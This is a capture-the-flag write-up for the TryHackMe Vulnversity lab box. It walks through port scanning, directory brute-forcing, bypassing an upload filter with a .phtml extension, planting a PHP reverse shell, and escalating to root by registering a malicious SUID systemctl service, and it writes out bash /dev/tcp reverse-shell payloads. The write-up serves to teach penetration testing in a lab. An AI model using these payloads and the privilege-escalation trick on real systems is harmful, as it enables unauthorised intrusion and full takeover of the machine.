# Vulnversity Write-Up

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/vulnversity.png)

Vulnversity is a beginner level box to learn about recon, web app attacks and basic privesc.
---

## Deploy Machine

You may follow along this write up here on [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

### Connect via OpenVPN

If you are not subscribed yet on tryhackme, you may access all of the free rooms. If so, you need to connect your kali or any other pentesting distro to tryhackme network.

Connect to openvpn in order to recon and attack the machine.

if you are using the latest kali 2020.2:

```
sudo openvpn --config /path/to/openvpn_file.ovpn
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/openvpn.png)

To verify your connection, you may ping the ip_address of the machine indicated on your session.

To know your private address on the openvpn configuration, just type on the terminal:
```
ifconfig tun0
```

---

## Reconnaissance, Enumeration and Initial Access

In manual penetration testing, the first phase is to enumerate open ports. We can use the [nmap](https://nmap.org) tool to scan for open ports.

Create a directory to store the nmap file
```
mkdir nmap
nmap -sV -sC -oA nmap/vulnversity -v <ip_address>
```

Even the scanning is not done, we can see all of the open ports on the machine if we specify the -v flag on nmap.

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/initscan.png)

To learn what services running, we can wait until the scanning is finished.

As we can see below, the Apache (Web server) is running on port 3333. View more details on the [nmap directory](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/nmap)

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/port_scan_apache.png)

Open the ip address of the machine in a browser: http://ip_address:3333


![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/website.png)

Since we discovered that the machine is running a web server, we might need to check for hidden directories. On this challenge on tryhackme we are being introduced to some tools to locate hidden directories. But lets try the very basic first. 

http://ip_address:3333/robots.txt

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/robots.txt.png)

We can't find any hidden directories. Let's try to find any vulnerabilities on the web pages we will find using our toolset where possibly we can upload our reverse shell to gain initial access to the server. There's a lot of tools available. But on this write-up I'll use gobuster.

### Install gobuster

If you are using kali 2020.2 you just need to run
```
sudo apt install gobuster -y
```
to install gobuster.

If you are using other pentesting distro, or lower versions of kali we might need to build it from scratch.

To install go lang, go to: [https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz](https://golang.org/doc/install?download=go1.14.6.linux-amd64.tar.gz)

To verify your installation make sure that you will see the helpscreen:
```
/path/gobuster --help
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/gobuster.png)

Now use gobuster to bruteforce hidden directories on the server:
```
gobuster dir -u http://<ip_address>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/gobuster-scan.png)

We see that, all of the directories shown on the result. Now we can start check those directories. We will find that we can upload a file on https://ip_address:3333/internal/

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/upload_page_discovered.png)

We now need to check what is the extension type to upload so we can bypass the check. Webshells are present in /usr/share/web on kali. or if not you may use the php web shell on the link provided by tryhackme. 

Or why not create one?

```
echo "bash -i >& /dev/tcp/<ip_address>/<port> 0>&1" | base64 | xclip
echo '<?php echo system("echo sub | base64 -d | bash"); ?>' | sed s/sub/$(xclip -o)/g > revshell.php
```

So now we have created a php reverse shell try and upload it on the server. We encode it to base64 since /bin/sh is not running on php, you'll have a problem on fds if you're not going to encode it.

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/extension_not_allowed.png)

The extension is not allowed. This is a common filtering to ensure that no malicious codes can be uploaded on the server. But let us use BurpSuite to check for vulnerability and what might be a file extenstion can be uploaded on the server.

Following task 4 on Vulnversity, we will customized our attack by creating a simple dictionary for file extensions on burpsuite.

To setup burp, we just need to download foxy proxy as the extension and add a new proxy:

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/foxy_proxy_setup.png)

Once the proxy is setup, go back to http://ip_address:3333/internal/ and upload the anyfile without a .php extension. Don't submit yet since we need to ensure that we can intercept the browser traffic by capturing all traffic from foxyproxy to burpsuite.

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/capture_traffic_foxy.png)

After capturing and hitting submit, it will be redirected to burpsuite. Click on proxy > Action > Send to Intruder. After sending it to intruder, go to Positions tab > modify the extension to be blank. it should be:
```
anyfile.§§
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/anyfile_intruder.png)

Now go to Payloads tab and add these payloads and start attack:
```
php
php3
php4
php5
phtml
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/payload_intruder.png)

You will notice that phtml file has a different length than others. Also on the response tab we will see that it successfully uploaded the file.

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/burp_success.png)

Create a listener to initiate reverse shell.

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/listener.png)

Now we just need to rename our revshell.php to revshell.phtml, turn off the foxyproxy and upload the file. Go to the uploads directory on the web.
```
http://ip_address:3333/internal/uploads/revshell.phtml
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/revshell_success.png)

We successfully accessed the system. Now we need to find some details what is our access and who is the administrator.

```
whoami; id; ls /home; 
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/access_details.png)

Now get the user flag on /home/bill/

```
cat /home/bill/user.txt

8bd799[redacted]
```

---
## Privilege Escalation

SUID is a file permission that is given to some binaries which are allowed to be run by user but also running on root. We must find all suid permissions on the machine and target the most likely juicy piece of binary to escalate our privilege. To find SUIDs, you just need to use the find command.
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/suids.png)

On SUID files, we had found /bin/systemctl.

systemctl is a binary that controls interfaces, services for init systems. When you are already familiar with linux remember you start services on boot or starting them manually as usual. Systemctl search configuration files on systemd under /etc/system/systemd

Create a listener first, since the payload will be a reverse shell.

```
nc -lvnp 1337
```

We do not have access to paths owned by root. On privesc, you may search for references but you may view this one [here](https://gtfobins.github.io/gtfobins/systemctl/).

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/gtfobins_privesc.png)

```
catx0rr=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/<ip_address>/<port> 0>&1"
[Install]
WantedBy=multi-user.target' > $catx0rr
/bin/systemctl link $catx0rr
/bin/systemctl enable --now $catx0rr
```

Once executed, your listener should get the shell from root since the SUID is running as root.

![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/rooted.png)

```
cat /root/root.txt

a58ff8[redacted]
```
